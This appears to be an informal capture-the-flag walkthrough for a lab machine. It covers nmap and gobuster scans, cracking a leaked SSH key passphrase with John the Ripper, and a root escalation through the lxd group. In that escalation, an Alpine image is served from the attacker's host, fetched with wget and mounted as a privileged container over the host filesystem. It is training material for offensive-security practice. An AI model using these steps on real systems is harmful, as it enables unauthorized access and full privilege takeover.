first do an nmap, will not show anything with a -Pn
	sudo nmap -p- -vv -sC -sV -A -O -Pn 10.10.207.250
We see port 80 and 22 immediantely, lets go to port 80
Lets also start a gobuster
	gobuster dir -u http://10.10.207.250/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	we find a couple of things in /uploads including a dict list, looks like a wordlist for passwords
	lets copy that to make a wordlist out of it
	In secret we find a secret key, lets use john for ssh2john
		make a new nano file, copy and paste the rsa key
		python /usr/share/john/ssh2john.py gaming_rsa > gamingcrack
		sudo john --wordlist=/usr/share/wordlists/rockyou.txt gaming_rsa
			we have a password
			but we still done have a name
I decided to go back to the main site and inspect element, we can see in green the name john, lets try that
sudo ssh -i gaming_rsa john@10.10.207.250
	ls -la and we find a user.txt
	we found the user flag YEAH
now we have to get root
I first tried hydra with the password list that I obtained before, however I do not know if this is a rabbit hole or not
It seems like it is, maybe the password was in that wordlist but we used rockyou.txt so we did not need their wordlist for this exercise
I logged back into john and saw that there was something called lxd, i have no idea what this is
	lxd turns out to be a linux container for root processes
	after some more research we can utilize an Alphine Builder which allows us to use lxd
		git clone https://github.com/saghul/lxd-alpine-builder.git
		cd lxd-alpine-builder
		sudo ./build-alpine
			this is going to take a minute
	while this is downloading see what john is capable of, such as typing in wget to know if we can just transfer the files over
		we can
	going through the directories we can see that john doesn't have much power, but lxd does
finally alpine finished and we can continue
another ls -la shows us that we have a tar.gz file lets send that over to john
lets first make a web server to send alpine over to john
python3 -m http.server on local machine
	on johns machine wget http://10.9.124.138:8000/alpine-v3.12-x86_64-20201118_0656.tar.gz
I unzipped it, that is why I do not have the gz at the end anymore, however I do not know if this is correct yet
	now import the image lxc image import ./alpine-v3.12-x86_64-20201118_0656.tar --alias my_image
	now we need to mount the image to the root directory
		lxc init my_image ignite -c security.privileged=true
		lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
		execute bin/sh to get to root
			lxc exec ignite /bin/sh
				cd ..
				cd /root/
				nothing here
				find / -name root.txt
				go to that directory and you will find root.txt
